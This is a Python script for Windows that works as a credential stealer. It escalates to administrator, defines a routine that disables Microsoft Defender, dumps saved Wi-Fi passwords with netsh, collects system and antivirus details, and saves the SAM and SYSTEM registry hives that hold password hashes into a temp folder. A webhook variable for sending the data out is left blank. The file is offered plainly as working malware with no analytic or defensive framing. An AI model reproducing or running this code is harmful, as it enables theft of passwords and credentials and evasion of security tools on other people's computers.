import os
import random
import ctypes, sys
from psutil import process_iter as process

# Variables
cur = os.getcwd()
name = (os.getenv("username") + str(random.randint(1,100)))
# webhook = 
# 


def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

if is_admin():   
    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False


    def isworking(exe):
        a = "{}".format(exe) in (i.name() for i in process())
        return a
        

        

    def defenderkill():
        os.system("Powershell -Command Set-ExecutionPolicy Unrestricted -Force")
        if isworking("MsMpEng.exe")==False or isworking("msmpeng.exe")==True :
            os.system("Powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true")
            os.system("""reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f""")
        
    def mkdir(name):
        os.system("mkdir {}".format(name))

    def cd(name):
        os.chdir("{}".format(name))

    def code():
        # defenderkill()
        global name
        global webhook
        cd(os.getenv("temp"))
        mkdir(name)
        cd(name)
        mkdir("Browser")
        mkdir("Wifi")
        mkdir("Windows")
        os.system("netsh wlan show profile * key=clean >> Wifi/wificredentials.txt")
        os.system("tasklist >> tasklist.txt")
        os.system("echo Current User : %username% >> info.txt")
        os.system("echo Execution Date : %date% >> info.txt")
        os.system("echo Execution Directory : {} >> info.txt".format(cur))
        os.system("""Powershell -command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct" >> info.txt""")
        os.system("reg save hklm\sam Windows\sam")
        os.system("reg save hklm\system Windows\system")
        os.system("pause")
    code()

else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1) 






    
